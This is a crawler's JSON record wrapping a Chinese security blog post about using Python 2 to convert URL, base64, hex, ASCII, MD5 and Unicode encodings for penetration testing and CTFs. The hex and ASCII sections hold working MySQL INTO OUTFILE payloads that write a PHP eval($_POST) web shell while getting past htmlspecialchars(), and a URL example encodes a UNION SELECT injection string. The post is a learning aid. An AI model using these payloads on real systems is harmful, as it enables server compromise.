{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2021-04-03 15:08:10","updatedTime":"2021-04-03 15:08:10","title":"妙用python之编码转换","link":"https://www.ohlinge.cn/python/python_encode.html","description":"\n<h2>0x01 前言</h2>\n<p>在日常渗透，漏洞挖掘，甚至是CTF比赛中，会遇到各种编码，常常伴随着这些编码之间的各种转换。记得刚入门那个时候，自己处理编码转换问题往往是“百度：url解码、base64加密、hex……”，或者是使用一款叫做“小葵多功能转换工具”的软件，再后来直接上Burpsuite的decoder功能，感觉用的还挺好的。不过，也遇到些问题：在线转换效率低(搜索占去了2/3的时间)、两款工具存在一些小问题，比如burp中涉及中文往往显示乱码。<br><br />\n<img src=\"https://www.ohlinge.cn/usr/uploads/2017/04/1673750151.png\" alt=\"QQ20170411-200238.png\" /><br />\n<img src=\"https://www.ohlinge.cn/usr/uploads/2017/04/3868705093.png\" alt=\"QQ20170411-210925.png\" /><br />\n直到使用python来作为我日常编码转换工具……</p>\n<h2>0x02 开启py转换之旅</h2>\n<p><strong>url编码</strong></p>\n<blockquote>\n<p>url编码是一种浏览器用来打包表单输入的格式.可谓是一名作为web人员最熟悉的一种编码方式了。</p>\n</blockquote>\n<pre><code class=\"language-python\">&#62;&#62;&#62; from urllib import *\n&#62;&#62;&#62; quote(&#34;union select null,null,null&#34;)\n'union%20select%20null%2Cnull%2Cnull'\n&#62;&#62;&#62; unquote(&#34;union%20select%20null%2Cnull%2Cnull&#34;)\n'union select null,null,null'\n&#62;&#62;&#62; urlencode({'x':'2333','y':'666'})\n'y=666&#38;x=2333'\n</code></pre>\n<p><br><br />\n<strong>Base64</strong></p>\n<blockquote>\n<p>Base64常常用作网页表单和HTTP传输的一些参数，也常用于邮件协议传输用户信息等。</p>\n</blockquote>\n<pre><code class=\"language-python\">&#62;&#62;&#62; import base64\n&#62;&#62;&#62; base64.b64encode(&#34;admin&#34;)\n'YWRtaW4='\n&#62;&#62;&#62; base64.b64decode('YWRtaW4=')\n'admin'\n</code></pre>\n<p>记得有次ctf比赛中考到了base32解密，一般网站不提供在线解密，一时之间貌似没有办法继续下去。不过如果你使用python的话会像上边解密base64一样简单，只需要将函数改变下：</p>\n<pre><code class=\"language-python\">&#62;&#62;&#62; import base64\n&#62;&#62;&#62; base64.b32encode('jjjjj')\n'NJVGU2TK'\n&#62;&#62;&#62; base64.b32decode('NJVGU2TK')\n'jjjjj'\n</code></pre>\n<p><br><br />\n<strong>Hex</strong></p>\n<blockquote>\n<p>十六进制编码也是web application中常见的一种编码方案。作为一名web安全人员，我们心知肚明的是，MySQL注入可以使用hex绕过htmlspecialchars()函数从而写入webshell。<br />\n比如：</p>\n</blockquote>\n<pre><code class=\"language-mysql\">select 0x3c3f70687020406576616c28245f504f53545b615d293b203f3e into outfile '/web/1.php'\n</code></pre>\n<p>下面是python实现hex加解密的方法：</p>\n<pre><code class=\"language-python\">&#62;&#62;&#62; '&#60;?php @eval($_POST[a]); ?&#62;'.encode('hex')\n'3c3f70687020406576616c28245f504f53545b615d293b203f3e'\n&#62;&#62;&#62;\n&#62;&#62;&#62; print '3c3f70687020406576616c28245f504f53545b615d293b203f3e'.decode('hex')\n&#60;?php @eval($_POST[a]); ?&#62;\n&#62;&#62;&#62;\n</code></pre>\n<p><br><br />\n<strong>ASCii</strong></p>\n<blockquote>\n<p>MySQL中的char()函数则是转换ascii码的，正因如此，也可以使用这个特性来绕过htmlspecialchars()函数。<br />\n比如：</p>\n</blockquote>\n<pre><code class=\"language-mysql\">select char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 97, 93, 41, 59, 32, 63, 62) into outfile '/web/1.php'\n</code></pre>\n<p>使用python将字符串转换ascii很简单，但是逆转换的话需要需要点小操作：</p>\n<pre><code class=\"language-python\">&#62;&#62;&#62; map(ord, &#34;&#60;?php phpinfo() ?&#62;&#34;)\n[60, 63, 112, 104, 112, 32, 112, 104, 112, 105, 110, 102, 111, 40, 41, 32, 63, 62]\n\n&#62;&#62;&#62; print chr(112)\np\n\n&#62;&#62;&#62; l = [60, 63, 112, 104, 112, 32, 112, 104, 112, 105, 110, 102, 111, 40, 41, 32, 63, 62]\n&#62;&#62;&#62; print ''.join(map(chr,l))    #感谢pcat表哥指出的方法\n&#60;?php phpinfo() ?&#62;\n</code></pre>\n<p><br><br />\n<strong>Md5</strong></p>\n<blockquote>\n<p>md5在web安全界可以说是人尽皆知了，以他的不可逆性，大多数网站存储用户密码等关键数据时常常使用md5加密。有的时候我们提交payload需要md5加密，这个时候用下面的方法就可以轻松实现。当然解密的话推荐去cmd5。</p>\n</blockquote>\n<pre><code class=\"language-python\">&#62;&#62;&#62; from hashlib import md5\n&#62;&#62;&#62; m = md5()\n&#62;&#62;&#62; m.update('this is a secret')\n&#62;&#62;&#62; m.hexdigest()\n'7dbbcee180ba4d456e4aa1cfbdad9c7b'\n\n&#62;&#62;&#62; m.hexdigest()[8:-8]\n'80ba4d456e4aa1cf'\n&#62;&#62;&#62;\n</code></pre>\n<p><br><br />\n<strong>Unicode转中文</strong></p>\n<blockquote>\n<p>unicode转换中文，很多情况下都能遇到。尤其是在做渗透测试的时候。用burp的话会存在中文乱码的问题，在python下实现非常简单。</p>\n</blockquote>\n<pre><code class=\"language-python\">&#62;&#62;&#62; print u&#34;\\u4f60\\u9700\\u8981\\u91cd\\u65b0\\u767b\\u9646&#34;\n你需要重新登陆\n</code></pre>\n<h2>0x03 后记</h2>\n<p>python实际上在实际使用中非常方便，编码转换只是其中一个例子。文中提到的编码转换皆为笔者日常积累，如果有没有涉及到的地方，欢迎评论补充。</p>\n\n","descriptionType":"html","publishedDate":"Tue, 11 Apr 2017 23:32:00 +0000","feedId":26303,"bgimg":"https://www.ohlinge.cn/usr/uploads/2017/04/1673750151.png","linkMd5":"bf53359a484d8bbdac5e19c7cebd83a2","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn81@2020_5/2021/04/03/07-08-12-753_2dfa5c4827a7e0e0.webp","destWidth":550,"destHeight":495,"sourceBytes":135690,"destBytes":13816,"author":"0h1in9e","articleImgCdnMap":{"https://www.ohlinge.cn/usr/uploads/2017/04/1673750151.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn81@2020_5/2021/04/03/07-08-12-753_2dfa5c4827a7e0e0.webp","https://www.ohlinge.cn/usr/uploads/2017/04/3868705093.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn85@2020_3/2021/04/03/07-08-15-877_9cbbb5806e1511aa.webp"},"publishedOrCreatedDate":1617433690080}],"record":{"createdTime":"2021-04-03 15:08:10","updatedTime":"2021-04-03 15:08:10","feedId":26303,"fetchDate":"Sat, 03 Apr 2021 07:08:10 +0000","fetchMs":63140,"handleMs":6,"totalMs":69629,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"7e5d36044093092a9d3be949b5016229","hostName":"europe-57*","requestId":"a5b51944d7f54716b8a4b066a6ea74b4_26303","contentType":"application/rss+xml; charset=UTF-8","totalBytes":30510,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":2,"articlesImgsGithubTotal":2,"successGithubMap":{"myreaderx33":1,"myreaderx19":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 02:38:11","updatedTime":"2020-09-07 04:37:21","id":26303,"name":"0h1in9e' s Blog | 林歌博客","url":"https://www.ohlinge.cn/feed/","subscriber":125,"website":null,"icon":"https://www.ohlinge.cn/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx61/cdn55@2020_1/2020/09/06/20-37-11-798_9699534b45694544.ico","description":"0h1in9e's Blog ","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":13816,"tmpBodyImgCdnBytes":16694,"tmpBgImgCdnBytes":0,"extra4":{"start":1617433626605,"total":0,"statList":[{"spend":63469,"msg":"获取xml内容"},{"spend":6,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":3196,"msg":"正文链接上传到cdn"}]},"extra5":2,"extra6":2,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-023.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/usr/uploads/2017/04/1673750151.png","sourceStatusCode":200,"destWidth":550,"destHeight":495,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn81@2020_5/2021/04/03/07-08-12-753_2dfa5c4827a7e0e0.webp","sourceBytes":135690,"destBytes":13816,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":2798,"convertSpendMs":23,"createdTime":"2021-04-03 15:08:10","host":"us-035*","referer":"https://www.ohlinge.cn/python/python_encode.html","linkMd5ListStr":"bf53359a484d8bbdac5e19c7cebd83a2,bf53359a484d8bbdac5e19c7cebd83a2","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"132.5 KB","destSize":"13.5 KB","compressRate":"10.2%"},{"code":1,"isDone":false,"source":"https://www.ohlinge.cn/usr/uploads/2017/04/3868705093.png","sourceStatusCode":200,"destWidth":888,"destHeight":547,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn85@2020_3/2021/04/03/07-08-15-877_9cbbb5806e1511aa.webp","sourceBytes":45586,"destBytes":16694,"targetWebpQuality":75,"feedId":26303,"totalSpendMs":3040,"convertSpendMs":81,"createdTime":"2021-04-03 15:08:13","host":"us-023*","referer":"https://www.ohlinge.cn/python/python_encode.html","linkMd5ListStr":"bf53359a484d8bbdac5e19c7cebd83a2","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"44.5 KB","destSize":"16.3 KB","compressRate":"36.6%"}],"successGithubMap":{"myreaderx33":1,"myreaderx19":1},"failGithubMap":{}}